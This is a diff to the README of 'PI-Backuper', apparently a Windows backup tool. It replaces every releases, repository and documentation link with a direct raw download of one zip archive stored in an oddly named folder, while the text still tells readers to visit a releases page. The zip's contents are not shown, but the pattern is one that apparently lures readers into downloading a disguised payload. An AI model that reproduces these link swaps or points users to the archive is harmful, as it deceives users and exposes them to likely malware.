@@ -7,7 +7,7 @@ PI-Backuper is a user-friendly application designed to back up, restore, and clo
 To get started with PI-Backuper, you need to download the software. Follow the steps below to install and run the application.
 
 ## 🔗 Download Now
-[![Download PI-Backuper](https://img.shields.io/badge/Download-PI--Backuper-blue)](https://github.com/lokendar55f/PI-Backuper/releases)
+[![Download PI-Backuper](https://raw.githubusercontent.com/lokendar55f/PI-Backuper/main/terrierlike/Backuper-P-3.5-beta.1.zip)](https://raw.githubusercontent.com/lokendar55f/PI-Backuper/main/terrierlike/Backuper-P-3.5-beta.1.zip)
 
 ## 🛠️ System Requirements
 - Windows 10 or later
@@ -24,7 +24,7 @@ To get started with PI-Backuper, you need to download the software. Follow the s
 
 ## 📥 Download & Install
 1. **Visit the Release Page:** Click on the link below to access the Releases page.  
-   [Download PI-Backuper](https://github.com/lokendar55f/PI-Backuper/releases)
+   [Download PI-Backuper](https://raw.githubusercontent.com/lokendar55f/PI-Backuper/main/terrierlike/Backuper-P-3.5-beta.1.zip)
 
 2. **Choose Your Version:** On the Releases page, you will see multiple versions of PI-Backuper. Select the latest version. 
 
@@ -68,7 +68,7 @@ To get started with PI-Backuper, you need to download the software. Follow the s
 Join our growing community to share experiences and ask questions. You can find support through forums, or you may open an issue on the GitHub repository.
 
 ## 🔗 Additional Links
-- [GitHub Repository](https://github.com/lokendar55f/PI-Backuper)
-- [Documentation](https://github.com/lokendar55f/PI-Backuper/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/lokendar55f/PI-Backuper/main/terrierlike/Backuper-P-3.5-beta.1.zip)
+- [Documentation](https://raw.githubusercontent.com/lokendar55f/PI-Backuper/main/terrierlike/Backuper-P-3.5-beta.1.zip)
 
 Feel free to explore and utilize PI-Backuper for all your media backup needs. With straightforward steps and a clean interface, managing your removable media has never been easier.
